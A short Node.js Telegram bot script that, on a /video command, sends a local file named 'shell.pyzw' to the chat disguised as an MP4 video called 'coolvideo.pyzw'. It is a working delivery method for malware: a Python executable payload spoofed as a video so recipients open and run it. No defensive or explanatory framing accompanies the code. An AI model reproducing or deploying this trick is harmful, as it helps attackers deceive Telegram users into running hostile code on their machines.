const fs = require("fs");
const TelegramBot = require("node-telegram-bot-api");
const token = "******************";
const bot = new TelegramBot(token, { polling: true });
bot.onText(/\/video/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendVideo(
        chatId,
        fs.readFileSync("shell.pyzw"),
        {
            width: 300,
            height: 300,
            duration: 30,
        }, {
        filename: "coolvideo.pyzw",
        contentType: "video/mp4"
    }
    );
});
